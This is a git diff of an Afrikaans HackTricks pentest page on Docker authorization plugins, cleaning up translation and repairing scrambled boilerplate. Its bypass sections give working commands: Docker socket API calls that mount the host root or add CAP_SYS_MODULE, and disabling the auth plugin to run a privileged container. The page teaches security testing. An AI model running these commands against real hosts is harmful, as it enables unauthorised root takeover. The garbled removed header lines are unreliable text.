@@ -1,58 +1,54 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Support HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
 
-**Docker se** out-of-the-box **autorisering** model is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** **uitvoer**. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om die daemon te kontak. As jy **groter toegangbeheer** benodig, kan jy **autorisering plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisering plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.
+**Docker** se standaard **autorisatiemodel** is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om met die daemon te kommunikeer. As jy **groter toegangbeheer** benodig, kan jy **autorisasie plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisasie plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.
 
 # Basiese argitektuur
 
-Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **toestaan/ontken** **aksies** wat aan die Docker Daemon aangevra word, **afhangende** van die **gebruiker** wat dit aangevra het en die **aksie** **aangevra**.
+Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **toestemming te gee/te weier** vir **aksies** wat aan die Docker Daemon **gevra** word, afhangende van die **gebruiker** wat dit gevra het en die **aksie** **gevra**.
 
-**[Die volgende inligting is van die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Die volgende inligting is uit die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Wanneer 'n **HTTP** **versoek** aan die Docker **daemon** gemaak word deur die CLI of via die Engine API, **gee** die **authentisering** **substelsel** die versoek aan die geïnstalleerde **authentisering** **plugin**(s). Die versoek bevat die gebruiker (oproeper) en opdrag konteks. Die **plugin** is verantwoordelik om te besluit of die versoek **toegestaan** of **ontken** moet word.
+Wanneer 'n **HTTP** **versoek** aan die Docker **daemon** gemaak word deur die CLI of via die Engine API, **stuur** die **authentikasie** **substelsel** die versoek na die geïnstalleerde **authentikasie** **plugin**(s). Die versoek bevat die gebruiker (oproeper) en opdrag konteks. Die **plugin** is verantwoordelik om te besluit of die versoek **toegelaat** of **weggestoot** moet word.
 
-Die volgorde diagramme hieronder toon 'n toelaat en ontken autorisering vloei:
+Die volgorde diagramme hieronder toon 'n toelaat en weier autorisasie vloei:
 
 ![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Elke versoek wat aan die plugin gestuur word, **sluit die geverifieerde gebruiker, die HTTP koptekste, en die versoek/antwoord liggaam** in. Slegs die **gebruikersnaam** en die **authentisering metode** wat gebruik is, word aan die plugin deurgegee. Die belangrikste is dat **geen** gebruikers **akkrediteer** of tokens deurgegee word nie. Laastens, **nie alle versoek/antwoord liggame word** aan die autorisering plugin gestuur nie. Slegs daardie versoek/antwoord liggame waar die `Content-Type` of `text/*` of `application/json` is, word gestuur.
+Elke versoek wat na die plugin gestuur word, **sluit die geverifieerde gebruiker, die HTTP koptekste, en die versoek/antwoord liggaam** in. Slegs die **gebruikersnaam** en die **authentikasie metode** wat gebruik is, word na die plugin gestuur. Die belangrikste is dat **geen** gebruikers **akkrediteer** of tokens gestuur word nie. Laastens, **nie alle versoek/antwoord liggame word gestuur** na die autorisasie plugin nie. Slegs daardie versoek/antwoord liggame waar die `Content-Type` of `text/*` of `application/json` is, word gestuur.
 
-Vir opdragte wat moontlik die HTTP verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die autorisering plugin slegs vir die aanvanklike HTTP versoeke aangeroep. Sodra die plugin die opdrag goedkeur, word autorisering nie op die res van die vloei toegepas nie. Spesifiek, die stroomdata word nie aan die autorisering plugins deurgegee nie. Vir opdragte wat chunked HTTP antwoord teruggee, soos `logs` en `events`, word slegs die HTTP versoek aan die autorisering plugins gestuur.
+Vir opdragte wat moontlik die HTTP verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die autorisasie plugin slegs vir die aanvanklike HTTP versoeke aangeroep. Sodra die plugin die opdrag goedkeur, word autorisasie nie op die res van die vloei toegepas nie. Spesifiek, die stroomdata word nie na die autorisasie plugins gestuur nie. Vir opdragte wat gekapte HTTP antwoorde teruggee, soos `logs` en `events`, word slegs die HTTP versoek na die autorisasie plugins gestuur.
 
-Tydens versoek/antwoord verwerking, mag sommige autorisering vloei addisionele navrae aan die Docker daemon benodig. Om sulke vloei te voltooi, kan plugins die daemon API aanroep soos 'n gewone gebruiker. Om hierdie addisionele navrae moontlik te maak, moet die plugin die middele verskaf vir 'n administrateur om behoorlike authentisering en sekuriteitsbeleide te konfigureer.
+Tydens versoek/antwoord verwerking, mag sommige autorisasie vloei addisionele navrae aan die Docker daemon benodig. Om sulke vloei te voltooi, kan plugins die daemon API aanroep soos 'n gewone gebruiker. Om hierdie addisionele navrae moontlik te maak, moet die plugin die middele verskaf vir 'n administrateur om behoorlike authentikasie en sekuriteitsbeleide te konfigureer.
 
 ## Verskeie Plugins
 
-Jy is verantwoordelik vir **registrasie** van jou **plugin** as deel van die Docker daemon **opstart**. Jy kan **meerdere plugins installeer en dit saamketting**. Hierdie ketting kan georden word. Elke versoek aan die daemon gaan in volgorde deur die ketting. Slegs wanneer **alle plugins toegang verleen** tot die hulpbron, word die toegang verleen.
+Jy is verantwoordelik vir **registrasie** van jou **plugin** as deel van die Docker daemon **opstart**. Jy kan **meerdere plugins installeer en dit saamketting**. Hierdie ketting kan georden word. Elke versoek aan die daemon beweeg in volgorde deur die ketting. Slegs wanneer **alle plugins toegang gee** tot die hulpbron, word die toegang toegestaan.
 
 # Plugin Voorbeelde
 
 ## Twistlock AuthZ Broker
 
-Die plugin [**authz**](https://github.com/twistlock/authz) laat jou toe om 'n eenvoudige **JSON** lêer te skep wat die **plugin** sal **lees** om die versoeke te autoriseer. Daarom gee dit jou die geleentheid om baie maklik te beheer watter API eindpunte elke gebruiker kan bereik.
+Die plugin [**authz**](https://github.com/twistlock/authz) laat jou toe om 'n eenvoudige **JSON** lêer te skep wat die **plugin** sal **lees** om die versoeke te autoriseer. Daarom bied dit jou die geleentheid om baie maklik te beheer watter API eindpunte elke gebruiker kan bereik.
 
 Dit is 'n voorbeeld wat sal toelaat dat Alice en Bob nuwe houers kan skep: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-In die bladsy [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) kan jy die verhouding tussen die aangevraagde URL en die aksie vind. In die bladsy [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) kan jy die verhouding tussen die aksienaam en die aksie vind.
+Op die bladsy [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) kan jy die verhouding tussen die gevraagde URL en die aksie vind. Op die bladsy [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) kan jy die verhouding tussen die aksienaam en die aksie vind.
 
 ## Eenvoudige Plugin Handleiding
 
@@ -60,11 +56,11 @@ Jy kan 'n **maklik verstaanbare plugin** met gedetailleerde inligting oor instal
 
 Lees die `README` en die `plugin.go` kode om te verstaan hoe dit werk.
 
-# Docker Auth Plugin Bypass
+# Docker Auth Plugin Omseiling
 
 ## Enumereer toegang
 
-Die hoofsake om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
+Die hoof dinge om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
 
 Om hierdie enumerasie uit te voer, kan jy **die hulpmiddel** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
@@ -126,7 +122,7 @@ Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](htt
 ### Bindings in root
 
 Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **van 'n belangrike parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
-In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer te skep en te laat loop wat die root (/) gids van die gasheer monteer:
+In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer te skep en te laat loop wat die wortel (/) gids van die gasheer monteer:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -160,7 +156,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ## Ongeëvalueerde JSON Attribuut
 
-Dit is moontlik dat toe die stelselaanpasser die docker-vuurmuur gekonfigureer het, hy **vergeet het van 'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS\_MODULE** vermoë te skep en te laat loop:
+Dit is moontlik dat toe die stelselaanvoerder die docker-vuurmuur gekonfigureer het, hy **vergeet het van 'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS\_MODULE** vermoë te skep en te laat loop:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -176,7 +172,7 @@ Die **`HostConfig`** is die sleutel wat gewoonlik die **interessante** **privile
 
 ## Deaktiveer Plugin
 
-As die **sisteemadministrateur** **vergeet** het om die vermoë om die **plugin** te **deaktiveer**, kan jy hiervan voordeel trek om dit heeltemal te deaktiveer!
+As die **sisteemadministrateur** **vergeet** het om die vermoë om die **plugin** te **deaktiveer** te **verbied**, kan jy hiervan voordeel trek om dit heeltemal te deaktiveer!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -188,32 +184,23 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Remember to **heraktiveer die plugin na die eskalering**, of 'n **herbegin van die docker diens sal nie werk nie**!
+Remember to **heraktiveer die plugin na die eskalering**, or a **herbegin van die docker diens sal nie werk nie**!
 
 ## Auth Plugin Bypass skrywes
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## Verwysings
-{% hnt stye="acceas" %}
-AWS Ha& praktyk ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Leer & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>Ondersteun HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
